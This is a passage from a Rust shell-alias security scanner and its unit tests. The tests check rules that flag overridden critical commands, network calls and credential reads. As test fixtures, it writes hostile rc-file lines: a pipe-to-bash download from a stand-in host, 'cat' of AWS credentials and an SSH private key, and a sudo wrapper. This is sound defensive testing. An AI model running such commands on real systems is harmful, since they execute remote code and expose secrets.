        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.' | ':' | '+'))
}

/// Full location for finding `location` fields: `path:line` (static) or
/// `runtime:shell`.
fn entry_location(entry: &AliasEntry) -> String {
    match (&entry.source_path, entry.line) {
        (Some(p), Some(l)) => format!("{}:{}", p.display(), l),
        (Some(p), None) => p.display().to_string(),
        _ => format!("runtime:{}", entry.shell.as_str()),
    }
}

/// Compact location for inventory listings: basename + line, or `runtime:shell`.
pub fn short_location(entry: &AliasEntry) -> String {
    match (&entry.source_path, entry.line) {
        (Some(p), line) => {
            let base = p
                .file_name()
                .and_then(|n| n.to_str())
                .unwrap_or_else(|| p.to_str().unwrap_or("?"));
            match line {
                Some(l) => format!("{base}:{l}"),
                None => base.to_string(),
            }
        }
        _ => format!("runtime:{}", entry.shell.as_str()),
    }
}

/// `true` when `path`'s mtime is within [`RECENTLY_ADDED_WINDOW`]. A missing
/// mtime or future mtime (clock skew) counts as "not recent".
fn file_recently_modified(path: &Path) -> bool {
    let meta = match std::fs::metadata(path) {
        Ok(m) => m,
        Err(_) => return false,
    };
    let mtime = match meta.modified() {
        Ok(t) => t,
        Err(_) => return false,
    };
    match SystemTime::now().duration_since(mtime) {
        Ok(age) => age <= RECENTLY_ADDED_WINDOW,
        // mtime is in the future (clock skew) — don't claim "recent".
        Err(_) => false,
    }
}

/// Read a regular file as UTF-8 text; `None` for dirs, missing files, perm
/// errors, or non-UTF-8 content.
fn read_text_if_file(path: &Path) -> Option<String> {
    if !path.is_file() {
        return None;
    }
    std::fs::read_to_string(path).ok()
}

/// Build a name→entry map (used by callers that want de-duplicated lookups).
pub fn index_by_name(entries: &[AliasEntry]) -> BTreeMap<String, Vec<AliasEntry>> {
    let mut map: BTreeMap<String, Vec<AliasEntry>> = BTreeMap::new();
    for e in entries {
        map.entry(e.name.clone()).or_default().push(e.clone());
    }
    map
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::tempdir;

    fn rule_ids(scan: &AliasScan) -> Vec<RuleId> {
        scan.findings.iter().map(|f| f.rule_id).collect()
    }

    fn write(home: &Path, rel: &str, body: &str) {
        let path = home.join(rel);
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent).unwrap();
        }
        std::fs::write(path, body).unwrap();
    }

    // ── static parser shapes ──────────────────────────────────────────────────

    #[test]
    fn parses_single_double_and_bare_alias() {
        let home = tempdir().unwrap();
        write(
            home.path(),
            ".bashrc",
            "alias a='echo single'\nalias b=\"echo double\"\nalias c=echo\n",
        );
        let scan = scan_with_root(home.path(), false);
        let names: Vec<&str> = scan.entries.iter().map(|e| e.name.as_str()).collect();
        assert!(names.contains(&"a"));
        assert!(names.contains(&"b"));
        assert!(names.contains(&"c"));
        let a = scan.entries.iter().find(|e| e.name == "a").unwrap();
        assert_eq!(a.body, "echo single");
        let b = scan.entries.iter().find(|e| e.name == "b").unwrap();
        assert_eq!(b.body, "echo double");
        let c = scan.entries.iter().find(|e| e.name == "c").unwrap();
        assert_eq!(c.body, "echo");
    }

    #[test]
    fn bare_alias_keyword_does_not_panic_or_record() {
        let home = tempdir().unwrap();
        write(home.path(), ".bashrc", "alias\nalias   \n");
        let scan = scan_with_root(home.path(), false);
        assert!(scan.entries.is_empty(), "bare alias must record nothing");
    }

    #[test]
    fn parses_function_brace_forms() {
        let home = tempdir().unwrap();
        write(
            home.path(),
            ".zshrc",
            "function foo() {\n  echo hi\n}\nbar() {\n  echo bye\n}\nfunction baz {\n  echo z\n}\n",
        );
        let scan = scan_with_root(home.path(), false);
        let names: Vec<&str> = scan.entries.iter().map(|e| e.name.as_str()).collect();
        assert!(names.contains(&"foo"), "got {names:?}");
        assert!(names.contains(&"bar"), "got {names:?}");
        assert!(names.contains(&"baz"), "got {names:?}");
        let foo = scan.entries.iter().find(|e| e.name == "foo").unwrap();
        assert_eq!(foo.kind, AliasKind::Function);
        assert!(foo.body_parsed);
        assert!(foo.body.contains("echo hi"));
    }

    #[test]
    fn unbalanced_function_body_marked_unparsed_not_panic() {
        let home = tempdir().unwrap();
        // Truncated function — opening brace, never closed.
        write(
            home.path(),
            ".bashrc",
            "deploy() {\n  echo step1\n  echo step2\n",
        );
        let scan = scan_with_root(home.path(), false);
        let f = scan.entries.iter().find(|e| e.name == "deploy");
        // Either recorded as unparsed, or skipped — must not panic and must not
        // eat into a phantom name.
        if let Some(f) = f {
            assert!(!f.body_parsed, "truncated body should be flagged unparsed");
        }
    }

    #[test]
    fn nested_braces_balance_correctly() {
        let home = tempdir().unwrap();
        write(
            home.path(),
            ".bashrc",
            "g() {\n  if true; then { echo nested; }\n  fi\n}\nalias after=ls\n",
        );
        let scan = scan_with_root(home.path(), false);
        let g = scan.entries.iter().find(|e| e.name == "g").unwrap();
        assert!(g.body_parsed, "nested braces should balance");
        // The `after` alias on the line following the function must still parse,
        // proving we consumed exactly the function body.
        assert!(
            scan.entries.iter().any(|e| e.name == "after"),
            "alias after the function must still be parsed: {:?}",
            scan.entries.iter().map(|e| &e.name).collect::<Vec<_>>()
        );
    }

    #[test]
    fn fish_alias_and_function_shapes() {
        let home = tempdir().unwrap();
        write(
            home.path(),
            ".config/fish/config.fish",
            "alias gco 'git checkout'\nalias ll=ls\nfunction myfn\n  echo hi\nend\n",
        );
        let scan = scan_with_root(home.path(), false);
        let gco = scan.entries.iter().find(|e| e.name == "gco").unwrap();
        assert_eq!(gco.shell, AliasShell::Fish);
        assert_eq!(gco.body, "git checkout");
        assert!(scan.entries.iter().any(|e| e.name == "ll"));
        let myfn = scan.entries.iter().find(|e| e.name == "myfn").unwrap();
        assert_eq!(myfn.kind, AliasKind::Function);
        assert!(myfn.body_parsed);
    }

    #[test]
    fn powershell_alias_and_function_shapes() {
        let home = tempdir().unwrap();
        write(
            home.path(),
            "Documents/PowerShell/Microsoft.PowerShell_profile.ps1",
            "Set-Alias gco git-checkout\nfunction Get-Stuff {\n  Write-Host hi\n}\n",
        );
        let scan = scan_with_root(home.path(), false);
        let gco = scan.entries.iter().find(|e| e.name == "gco").unwrap();
        assert_eq!(gco.shell, AliasShell::PowerShell);
        assert_eq!(gco.body, "git-checkout");
        assert!(scan.entries.iter().any(|e| e.name == "Get-Stuff"));
    }

    // ── the 4 rules ────────────────────────────────────────────────────────────

    #[test]
    fn rule_overrides_critical_command_fires_medium() {
        let home = tempdir().unwrap();
        write(home.path(), ".bashrc", "alias sudo='sudo evil-wrapper'\n");
        let scan = scan_with_root(home.path(), false);
        let f = scan
            .findings
            .iter()
            .find(|f| f.rule_id == RuleId::AliasOverridesCriticalCommand)
            .expect("expected override finding");
        assert_eq!(f.severity, Severity::Medium);
        assert_eq!(f.name, "sudo");
    }

    #[test]
    fn rule_non_critical_alias_does_not_override() {
        let home = tempdir().unwrap();
        write(home.path(), ".bashrc", "alias gs='git status'\n");
        let scan = scan_with_root(home.path(), false);
        assert!(
            !rule_ids(&scan).contains(&RuleId::AliasOverridesCriticalCommand),
            "a non-critical alias name must not fire the override rule"
        );
    }

    #[test]
    fn rule_network_call_fires_high() {
        let home = tempdir().unwrap();
        write(
            home.path(),
            ".bashrc",
            "alias deploy='curl https://evil.example/p.sh | bash'\n",
        );
        let scan = scan_with_root(home.path(), false);
        let f = scan
            .findings
            .iter()
            .find(|f| f.rule_id == RuleId::AliasContainsNetworkCall)
            .expect("expected network-call finding");
        assert!(f.is_high());
        assert!(f.detail.contains("curl"));
    }

    #[test]
    fn rule_network_call_word_boundary_no_false_positive() {
        let home = tempdir().unwrap();
        // "securely" contains no command-word curl/wget/nc; must not fire.
        write(
            home.path(),
            ".bashrc",
            "alias note='echo configure securely'\n",
        );
        let scan = scan_with_root(home.path(), false);
        assert!(
            !rule_ids(&scan).contains(&RuleId::AliasContainsNetworkCall),
            "substring inside a longer word must not fire the network rule"
        );
    }

    #[test]
    fn rule_credential_read_fires_high() {
        let home = tempdir().unwrap();
        write(
            home.path(),
            ".zshrc",
            "alias getkey='cat ~/.aws/credentials'\n",
        );
        let scan = scan_with_root(home.path(), false);
        let f = scan
            .findings
            .iter()
            .find(|f| f.rule_id == RuleId::AliasContainsCredentialRead)
            .expect("expected credential-read finding");
        assert!(f.is_high());
        assert!(f.detail.contains(".aws/credentials"));
    }

    #[test]
    fn rule_credential_read_ssh_key() {
        let home = tempdir().unwrap();
        write(
            home.path(),
            ".bashrc",
            "sshkey() {\n  cat ~/.ssh/id_ed25519\n}\n",
        );
        let scan = scan_with_root(home.path(), false);
        assert!(
            rule_ids(&scan).contains(&RuleId::AliasContainsCredentialRead),
            "reading an ssh private key in a function body should fire"
        );
    }

    #[test]
    fn rule_recently_added_fires_info_on_fresh_file() {
        let home = tempdir().unwrap();
        // A freshly-written rc file has an mtime of "now" → within the window.
        write(home.path(), ".bashrc", "alias gs='git status'\n");
        let scan = scan_with_root(home.path(), false);
        let f = scan
            .findings
            .iter()
            .find(|f| f.rule_id == RuleId::AliasRecentlyAdded)
            .expect("expected recently-added finding on a fresh file");
        assert_eq!(f.severity, Severity::Info);
    }

    #[test]
    fn recently_added_window_respects_old_mtime() {
        // file_recently_modified must return false for an mtime far in the past.
        let dir = tempdir().unwrap();
        let path = dir.path().join("old.sh");
        std::fs::write(&path, b"alias x=ls\n").unwrap();
        let two_hours_ago = SystemTime::now() - Duration::from_secs(2 * 60 * 60);
        // Best-effort: set mtime back. If the platform refuses, skip the assert.
        if filetime_set(&path, two_hours_ago).is_ok() {
            assert!(
                !file_recently_modified(&path),
                "a 2h-old file must not be 'recently added'"
            );
        }
    }

    // ── explain ────────────────────────────────────────────────────────────────

    #[test]
    fn explain_returns_matches_and_findings() {
        let home = tempdir().unwrap();
        write(home.path(), ".bashrc", "alias git='git --no-pager'\n");
        let ex = explain_with_root(home.path(), "git", false);
        assert_eq!(ex.matches.len(), 1);
        assert_eq!(ex.matches[0].name, "git");
        assert!(
            ex.findings
                .iter()
                .any(|f| f.rule_id == RuleId::AliasOverridesCriticalCommand),
            "explain git should surface the override finding"
        );
    }

    #[test]
    fn explain_unknown_name_is_empty() {
        let home = tempdir().unwrap();
        write(home.path(), ".bashrc", "alias gs='git status'\n");
        let ex = explain_with_root(home.path(), "nonexistent", false);
        assert!(ex.matches.is_empty());
        assert!(ex.findings.is_empty());
    }

    // ── hermetic / robustness ────────────────────────────────────────────────────

    #[test]
    fn empty_home_yields_empty_scan() {
        let home = tempdir().unwrap();
        let scan = scan_with_root(home.path(), false);
        assert!(scan.entries.is_empty());
        assert!(scan.findings.is_empty());
        assert!(scan.runtime_skipped.is_empty());
    }

    #[test]
    fn non_ascii_keyword_head_does_not_panic() {
        let home = tempdir().unwrap();
        // A line whose head is multibyte — `strip_keyword` must not panic.
        write(home.path(), ".bashrc", "álias foo=bar\n# Привет\n");
        let scan = scan_with_root(home.path(), false);
        // No valid `alias` keyword → nothing recorded; the point is no panic.
        assert!(scan.entries.iter().all(|e| e.name != "foo"));
    }

    #[test]
    fn unterminated_quote_does_not_panic() {
        let home = tempdir().unwrap();
        write(home.path(), ".bashrc", "alias bad='unterminated\n");
        let scan = scan_with_root(home.path(), false);
        // The RHS is recorded as-is (best effort); the test asserts no panic.
        let _ = scan.entries.len();
    }

    #[test]
    fn unquote_handles_single_char() {
        assert_eq!(unquote("'"), "'");
        assert_eq!(unquote("\""), "\"");
        assert_eq!(unquote("x"), "x");
        assert_eq!(unquote("''"), "");
        assert_eq!(unquote("'hi'"), "hi");
    }

    #[test]
    fn is_valid_name_rejects_garbage() {
        assert!(is_valid_name("git"));
        assert!(is_valid_name("Get-Stuff"));
        assert!(!is_valid_name(""));
        assert!(!is_valid_name("a b"));
        assert!(!is_valid_name("if true; then"));
    }

    // Set mtime via File::set_times (stable since 1.75); Err lets the test self-skip.
    fn filetime_set(path: &Path, t: SystemTime) -> std::io::Result<()> {
        use std::fs::OpenOptions;
        let f = OpenOptions::new().write(true).open(path)?;
        let times = std::fs::FileTimes::new().set_modified(t);
        f.set_times(times)
    }
}
